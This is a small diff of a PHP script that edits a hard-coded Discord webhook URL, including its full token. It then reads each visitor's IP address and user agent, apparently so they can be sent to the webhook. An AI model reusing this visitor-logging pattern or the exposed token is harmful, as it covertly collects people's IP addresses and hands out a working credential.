@@ -1,5 +1,5 @@
 <?php
-$webhookurl = "https://discordapp.com/api/webhooks/829335196524347412/MPBKK5YgR8iH-DfogFfIzIN4Y60sAtXMvBbcB9p064rXKe2Jyalrl9XV7-9NnjqJ_ofm/github";
+$webhookurl = "https://discordapp.com/api/webhooks/829335196524347412/MPBKK5YgR8iH-DfogFfIzIN4Y60sAtXMvBbcB9p064rXKe2Jyalrl9XV7-9NnjqJ_ofm";
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $browser = $_SERVER['HTTP_USER_AGENT'];
